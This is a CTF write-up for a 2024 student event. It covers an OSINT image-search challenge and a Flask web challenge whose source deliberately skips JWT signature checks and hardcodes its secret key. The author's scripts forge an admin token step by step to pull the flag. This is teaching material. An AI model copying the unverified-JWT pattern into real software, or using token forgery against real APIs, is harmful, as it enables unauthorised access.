---
title: "CTF — Cyber Security Day"
date: 2024-11-09
categories: [CTF Writeup]
tags: [RSA, Cryptography, Math]
---

**Author:** CHAHAT Abdennour  
**Read Time:** 7 min  
**Published on:** Nov 9, 2024

## Introduction

The Cybersecurity Day 2024 CTF Challenge is part of the second edition of Cybersecurity Day, organized by Cyberforces in collaboration with the INSEC club. This challenge is designed for students passionate about ethical hacking.
![Cybersecurity Event](assets/images/1.webp)
---

## Challenge 1: OSINT - MyCastle_1

### **Description:**

"I’m trying to remember the name of the building on my left, but it seems that I can’t. Can you help? Example Flag: `INSEC{Maria-Sol}`"

The objective of this challenge is to identify the name of the building visible on the left side of the provided image.
![Cybersecurity Event](assets/images/2.webp)
### **Solution:**

1. Navigate to the [Google search engine homepage](https://www.google.com).
2. Select the ‘Search by Image’ option and upload the provided image.

   ![Cybersecurity Event](assets/images/4.webp)
After analyzing the image, the name of the building was identified as **Shin-Marunouch**.

**Flag:** `INSEC{Shin-Marunouch}`

---

## Challenge 2: Web - apisa

This challenge provides the source code, which is key to understanding the website’s functionality. Let’s break down the code to gain insights into how it operates.
![Cybersecurity Event](assets/images/5.webp)
### **Source Code:**
```python
from flask import Flask, request, render_template_string, session, redirect, url_for
import jwt
import json
import time
import re
import base64
import hashlib
from cryptography.hazmat.primitives import hashes
from functools import wraps

app = Flask(__name__)
app.secret_key = "dev_key_123"  
FLAG = "CSD{....}"            

def verify_token(token, timestamp):
    try:
        header = jwt.get_unverified_header(token)
        
        treasure_map = {
            'typ': lambda x: any(c in str(x) for c in "Why do pirates use HMAC?"),
            'alg': lambda x: str(x).lower() in ['none', 'hs256', "Because they love their ARRRgorithms!"],
            'kid': lambda x: str(x).split() == ["What's", "a", "pirate's", "favorite", "hash?"]
        }
        
        if not all(k in header for k in treasure_map) or \
           not any(treasure_map[k](header[k]) for k in treasure_map):
            return None
            
        if (int(timestamp) ^ 0xCAFEBABE) & 0xDEADBEEF:
            decoded = jwt.decode(token, options={"verify_signature": False})
        else:
            return None
            
        return decoded if all(k in decoded for k in ['role', 'timestamp']) else None
        
    except Exception as e:
        return None

@app.route('/api/request', methods=['POST'])
def api_request():
    try:
        timestamp = request.headers.get('X-Request-Timestamp')
        if not timestamp or abs(int(timestamp) - int(time.time())) > 30:
            return {'error': 'Invalid timestamp'}, 401

        version = request.headers.get('X-API-Version', '')
        if not re.match(r'^[12]\.[0-9]+$', version):
            return {'error': 'Invalid version format'}, 400

        auth_header = request.headers.get('Authorization', '')
        if not re.match(r'^Bearer\s+[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]*$', auth_header):
            return {'error': 'Invalid authorization format'}, 401

        token = auth_header.split(' ')[1]
        decoded = verify_token(token, timestamp)
        
        if not decoded:
            return {'error': 'Token validation failed'}, 401

        if decoded.get('role') != 'admin':
            return {'error': 'Insufficient privileges'}, 403

        data = request.get_json()
        if not data:
            return {'error': 'Invalid JSON'}, 400

        body_hash = hashlib.sha256(json.dumps(data, sort_keys=True).encode()).hexdigest()
        if body_hash != request.headers.get('X-Content-Hash'):
            return {'error': 'Invalid content hash'}, 400

        if version.startswith('1.'):
            options = data.get('options', {})
            if isinstance(options, str):
                try:
                    decoded_options = base64.b64decode(options)
                    if b'%' in decoded_options:
                        decoded_options = base64.b85decode(decoded_options)
                    options = json.loads(decoded_options)
                except:
                    return {'error': 'Invalid options format'}, 400
            data['options'] = options

        if '..' in json.dumps(data):
            return {'error': 'Invalid character sequence'}, 400

        if data.get('action') == 'read' and \
           data.get('resource') == 'document' and \
           data.get('options', {}).get('type') == 'admin':
            return {'success': True, 'flag': FLAG}

        return {'error': 'Invalid request parameters'}, 400

    except Exception as e:
        return {'error': 'Internal server error'}, 500


template = '''
<!DOCTYPE html>
<html>
<head>
    <title>CyberVault API Gateway</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        :root {
            --neon-text-color: #00ff00;
            --neon-border-color: #0ff;
            --bg-color: #0a0a0a;
            --card-bg: #1a1a1a;
        }
        
        body {
            font-family: 'Share Tech Mono', monospace;
            background-color: var(--bg-color);
            color: #fff;
            padding: 20px;
            margin: 0;
            line-height: 1.6;
            min-height: 100vh;
            background-image: 
                linear-gradient(rgba(10, 10, 10, 0.9), rgba(10, 10, 10, 0.9)),
                url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjIwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZGVmcz48cGF0dGVybiBpZD0iZ3JpZCIgd2lkdGg9IjQwIiBoZWlnaHQ9IjQwIiBwYXR0ZXJuVW5pdHM9InVzZXJTcGFjZU9uVXNlIj48cGF0aCBkPSJNIDQwIDAgTCAwIDAgMCA0MCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjMTExIiBzdHJva2Utd2lkdGg9IjEiLz48L3BhdHRlcm4+PC9kZWZzPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9InVybCgjZ3JpZCkiLz48L3N2Zz4=');
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }

        h1 {
            color: var(--neon-text-color);
            text-align: center;
            text-transform: uppercase;
            font-size: 2.5em;
            margin-bottom: 40px;
            text-shadow: 0 0 10px var(--neon-text-color),
                         0 0 20px var(--neon-text-color),
                         0 0 30px var(--neon-text-color);
            animation: flicker 1.5s infinite alternate;
        }

        .card {
            background: var(--card-bg);
            border: 1px solid var(--neon-border-color);
            border-radius: 5px;
            padding: 20px;
            margin: 20px 0;
            box-shadow: 0 0 10px var(--neon-border-color);
        }

        .token-display {
            background: #000;
            border: 1px solid var(--neon-border-color);
            border-radius: 5px;
            padding: 20px;
            margin: 20px 0;
            word-break: break-all;
            font-family: 'Share Tech Mono', monospace;
            color: #0f0;
            box-shadow: 0 0 15px var(--neon-border-color);
        }

        .time-box {
            background: #000;
            border: 1px solid #0ff;
            border-radius: 5px;
            padding: 15px;
            margin: 20px 0;
            text-align: center;
            font-size: 2em;
            color: #0ff;
            box-shadow: 0 0 15px #0ff;
            font-family: 'Share Tech Mono', monospace;
            letter-spacing: 2px;
        }

        .time-label {
            color: #666;
            text-transform: uppercase;
            font-size: 0.8em;
            margin-bottom: 5px;
        }

        @keyframes flicker {
            0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
                text-shadow: 0 0 10px var(--neon-text-color),
                             0 0 20px var(--neon-text-color),
                             0 0 30px var(--neon-text-color);
            }
            20%, 24%, 55% {
                text-shadow: none;
            }
        }

        .blink {
            animation: blink-animation 1s steps(5, start) infinite;
        }

        @keyframes blink-animation {
            to {
                visibility: hidden;
            }
        }
    </style>
    <script>
        function updateTime() {
            const now = new Date();
            const hours = String(now.getHours()).padStart(2, '0');
            const minutes = String(now.getMinutes()).padStart(2, '0');
            const seconds = String(now.getSeconds()).padStart(2, '0');
            document.getElementById('time').innerText = `${hours}:${minutes}:${seconds}`;
        }
        
        // Update time every second
        setInterval(updateTime, 1000);
        
        // Initial update
        window.onload = updateTime;
    </script>
</head>
<body>
    <div class="container">
        <h1>CyberVault API Gateway</h1>
        <div class="card">
            <h2>Welcome, Agent</h2>
            <p>Your API token:</p>
            <div class="token-display">{{ message }}</div>
            
            <div class="time-box">
                <div class="time-label">Server Time</div>
                <div id="time">{{ current_time }}</div>
            </div>
            
            <p class="blink">_</p>
        </div>
    </div>
</body>
</html>
'''

@app.route('/', methods=['GET'])
def index():
    try:
        current_timestamp = int(time.time())
        current_time = time.strftime("%H:%M:%S")
        token = jwt.encode(
            {'role': 'guest', 'timestamp': str(current_timestamp)}, 
            app.secret_key, 
            algorithm='HS256'
        )
        return render_template_string(template, 
            message=token,
            current_time=current_time
        )
    except Exception as e:
        print(f"Error in index route: {e}")
        return str(e), 500

@app.route('/debug')
def debug():
    return "Application is running!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
```
### Overview
The website was built using Python’s Flask framework and provided three main endpoints:
1. `/` - Returns a JWT encoded token.
2. `/debug` - For debugging purposes.
3. `/api/request` - Validates and processes API requests.

### Analyzing the JWT Token

The home endpoint (`/`) generates and returns a JWT token. Using tools like [JWT.io](https://jwt.io/#debugger-io), we can decode the token to reveal:
```text
"_comment": "HEADER:ALGORITHM & TOKEN TYP"
{
  "typ": "JWT",
  "alg": "HS256"
}

"_comment": "PAYLOAD:DATA"
{
  "role": "guest",
  "timestamp": "1731174807"
}

"_comment": "VERIFY SIGNATURE"
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
)
```
### Accessing the Flag via the `/api/request` Endpoint

The flag can be accessed through the `/api/request` endpoint using a **POST** request. Below is a Python script to interact with this endpoint:

```python
import requests
import jwt
import json
import time
import hashlib
import base64

url = 'https://apisa.snakeeyes-blogs.xyz/api/request' 
secret_key = "dev_key_123"

header = {
    "typ": "JWT",
    "alg": "HS256"
}

payload = {
    "role": "guest",
    "timestamp": "1731174807"
}

token = jwt.encode(payload, secret_key, algorithm='HS256', headers=header)

# JSON body
data = {
    
}

# Generate the SHA-256 hash of the JSON body
body_hash = hashlib.sha256(json.dumps(data, sort_keys=True).encode()).hexdigest()

# Make the POST request
response = requests.post(url, json=data)

# Print the response
print("Status Code:", response.status_code)
print("Response JSON:", response.json())
```
### JWT Token Creation and POST Request
Create a JWT token using the provided secret key and payload, including user role and timestamp, then generates a hash of the JSON data for the request body and sends a POST request to the specified URL with the JWT token and hashed data, finally, print the server’s response status code and the received JSON data.

run this script (command: python3 apisa.py), and we get:

`python3 tmp_script.py`
```text
Status Code: 401
Response JSON: {'error': 'Invalid timestamp'}
The api_request function requires a header with a valid timestamp, accurate to within 30 seconds of its generation. Additionally, the header should include the API version and authorization credentials. Update your code to incorporate these requirements:
```
The api_request function requires a header with a valid timestamp, accurate to within 30 seconds of its generation. Additionally, the header should include the API version and authorization credentials. Update your code to incorporate these requirements:

```python
api_version = '1.0'
timestamp = str(int(time.time()))
token_payload = {
    "role": "admin",
    "timestamp": timestamp
}
headers = {
    "X-Request-Timestamp": timestamp,
    "X-API-Version": api_version,
    "Authorization": f"Bearer {token}",
    "X-Content-Hash": body_hash,
    "Content-Type": "application/json"
}

# update the POST request
response = requests.post(url, headers=headers, json=data)
```

### Running the Script Again

Run the script again and we get a new output:

```text
Status Code: 401
Response JSON: {'error': 'Token validation failed'}
```
### Updating the JWT Header for Compliance
From the verify_token function, our script requires updates to its JWT header to ensure compliance with the specified verification conditions.

Update the header as follows:
```python
header ={
    "typ": "Why do pirates use HMAC?",
    "alg": "HS256",
    "kid": "What's a pirate's favorite hash?"
}
```
great, we get a new message:
```text
Status Code: 403
Response JSON: {'error': 'Insufficient privileges'}
```
### Review the source code to identify the cause of the message:
The issue arises from an incorrect role setting, ensure that the ‘role’ is set to ‘admin’:
```python
payload = {
    "role": "admin",
    "timestamp": "1731177215"
}
```
Reviewing the source code, it’s evident that the JSON body must contain specific settings: ‘action,’ ‘resource,’ and ‘options.’ Update your code’s JSON body to include these settings, following the example provided:
```python
# Define a valid JSON body
data = {
    "action": "read",
    "resource": "document",
    "options": {
        "type": "admin"
    }
}

# update body hash 
body_hash = hashlib.sha256(json.dumps(data, sort_keys=True).encode()).hexdigest()
```
### finally, we get the flag:
```text
Status Code: 200
Response JSON: {‘flag’: ‘CSD{N0N3_C4N_B3_US3D_4G41NST_M3}’, ‘success’: True}
```
